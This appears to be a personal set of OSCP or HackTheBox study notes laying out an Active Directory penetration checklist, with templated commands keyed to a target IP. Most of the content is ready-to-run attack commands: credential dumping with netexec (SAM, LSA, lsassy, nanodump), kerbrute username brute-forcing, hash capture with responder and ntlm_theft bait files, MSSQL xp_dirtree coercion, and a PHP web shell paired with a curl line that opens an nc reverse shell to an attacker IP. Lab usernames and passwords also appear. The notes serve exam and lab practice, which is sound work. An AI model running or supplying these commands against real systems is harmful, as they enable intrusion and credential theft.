## Time Sync

Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues./

```
faketime "$(ntpdate -q <DC_IP> | cut -d ' ' -f 1,2)" COMMAND-GOES-HERE 
```

```
sudo timedatectl set-ntp false
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ntpdate -s ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
# Ping Test

```
Test-NetConnection PIVOT_INTERNAL_IP -Port 4444
```

---

1. if you have a admin shell via godpotato then its nt authority system

2. meaning any command you run will work on that machine locally. cant add to domain admins but you can add to local administrators group, which once we do that, its easy to do enum outside of that shell with netexec smb

3. oh yea, if you dont already along with doing --sam --lsa in the same command. run modules with netexec . . .   

 nxc smb IP -u user -p password --sam --lsa
 netexec smb IP -u user -p password -M lsassy
  netexec smb IP -u user -p password -M nanodump

`net localgroup administrators`

Add your current root user as administrator
```
net localgroup administrators <DOMAIN\USERNAME> /add
```

then run nxc as this user

if fail, check if he is administrator
```
nxc smb IP -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
```

---
## Discovering Domain Name
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ldapsearch -x -H ldap://${ip} -s base namingContexts`;

dv.paragraph("```bash\n" + command + "\n```");
```
Add hosts to /etc/hosts 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
## Port 53 : DNS

## DNS Zone Transfer
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `dig axfr ${ip} ${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Port 80 : HTTP

[[Windows LFI RFI]]

If File Inclusion can call back to KALI ATTACKER, responder will catch a hash.

[[Responder]]

```
sudo responder -I tun0 -dwv
```

Call to your KALI ATTACKER SMB through URL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `?page=//${KaliIP}/share/test.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[inetpub]]

---
## Port 88 : Kerberos

## No creds at all : Kerbrute force usernames

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `kerbrute userenum -d ${discoveredDomain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
## looking for Users : looksupid --rid-brute
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' | cut -d'\\\' -f 2 | tee users`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260910111923.png]]

Add these usernames into user_list

---
## Port 139 : SMB

NetExec Share Listing
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `nxc smb ${discoveredDomain} -u [user] -p '[password]' --shares`;

dv.paragraph("```bash\n" + command + "\n```");
```
SMB Cred Connect
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `smbclient //${discoveredDomain}/shared -U [user] '[password]'`;

dv.paragraph("```bash\n" + command + "\n```");
```

With write access to an otherwise empty share named `Shared`, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. [[NTLM Theft]] is a good tool to create a bunch of these files
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `python ~/Desktop/Tools/Windows/ntlm_theft/ntlm_theft.py  -g all -s ${KaliIP} -f exploit`;

dv.paragraph("```bash\n" + command + "\n```");
```

If you have write access into Web shares, upload shell.php and curl it

shell.php
```powershell
<?php system($_REQUEST['cmd']); ?>
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `curl ${discoveredDomain}/styles/shell.php?cmd=whoami`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
```

Check for value files like lsass.zip

SYSVOL contains Group Policy files, scripts and configuration data. Those can sometimes reveal credentials, service configurations or other weaknesses.

Group Policy Preferences have historically exposed credentials through an attribute called `cpassword` in services.xml

---
## Port 389 : LDAP
[[389 LDAP]]
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ldapsearch -H ldap://${ip} -x -s base namingcontexts`;

dv.paragraph("```bash\n" + command + "\n```");
```
Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally

Then try LDAP dump. There might be password and username

Try adding in user and password for a further search

```
ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.local' -w '#00^BlackKnight' > support_ldap_dump
```

---
## Port 1433 : MSSQL Database
### Get Net-NTLMv2

Try to get MSSQL to read a smb share off my KALI ATTACKER, which sends a hash that gets caught by responder listener

Open Listener
```
sudo responder -I tun0 -dwv
```

In MSSQL database query
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `EXEC xp_dirtree '\\\\${KaliIP}\\share', 1, 1`;

dv.paragraph("```bash\n" + command + "\n```");
```
---
## Port 1433 : MSSQL Database

Run single commands
```
mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW DATABASES;"
```

---
## Port 5985 : Evil-WinRM

```
net user C.Bum
```

![[Pasted image 20260913095952.png]]

If not a member of Remote Users, CANNOT Evil-WinRM

---

## NMAP Vuln Script Scan

#### TCP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sVC -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### UDP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sV -sC -sU -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```


---
## NXC Kerberos Ticket

Whenever nxc -k validates, generate a Kerberos Ticket using NXC

```
netexec smb [domain] -u '[user]' -p '[pw]' -k --generate-krb5-file krb5.conf
```

```
sudo cp krb5.conf /etc/krb5.conf
```

```
kinit f.frizzle
```

This will unlock kerberos login through SSH (-k flag to enable kerberos)

```
ssh -v -o GSSAPIAuthentication=yes -o GSSAPITrustDNS=yes [user]@ip
```

Note : /etc/hosts must only have 1 domain associated under the IP

## Hash the Salt

The hash is 64 hex characters, which is likely salted SHA256. `hashcat` can take this in the format `<hash>:<salt>`

```
hashcat [hash] /usr/share/wordlists/rockyou.txt
```

### LSASS

LSASS.dmp > Pypykatz > NT hash > Pass the Hash

# Pivoting

Check which ports are open in the target but not on KALI ATTACKER
```
netstat -a -p tcp | findstr LISTENING
```

[[inetpub]]

If HTTP server is only accessible enough, [[Chisel Reverse Port Forward]]

# Mistakes

1. Not enumerating thoroughly after landing on a new user

# Initial Foothold

[[Sqlite]]
# Lateral Movement

[[Runas]]
[[Synced OSCP Notes/OSCP Main Notes/Windows/Mimikatz|Mimikatz]]
[[PSHistory]]

# Priv Esc

[[PowerUp.ps1]]
[[LinWinPEAS]]
[[0 Seatbelt.exe]]
## whoami /priv
[[SeManageVolume]]
[[SeBackupPrivilege]]
[[SeRestorePrivilege]]
[[SeImpersonatePrivilege]]
## whoami /groups

```
whoami /groups
```

```
net groups
```

Any foreign groups, research.

[[GPO Abuse]]

If Azure spotted, try ADSync
[[Azure Admins Group]]
[[LAPS]]
## AD/ACL Techniques

[[ACL Abuse]]

[[CoerceToTGT]]

## AutoLogon
```
reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
```

[[Synced OSCP Notes/Small Toolkit/Guides/AD/Windows Credential Manager|Windows Credential Manager]]
### Check Recycle Bin

```
cd '$RECYCLE.BIN'
```

Recycle Bins have two types of files. The ones that start with `$I` store metadata about the file. The `$R` file holds the original content.

Download over the file

```
scp 'f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' wapt-backup-sunday.7z
```
## Powershell History

MODIFY
A User:: sql_svc
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit");
const user = page?.["A User"] ?? "NO USER FOUND";

const command = `cd C:\\Users\\${user}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine`;

dv.paragraph("```bash\n" + command + "\n```");
```
### Show hidden files in Powershell Dir
```
dir -Force
```


[[ADCS]]


---

## LOGINs






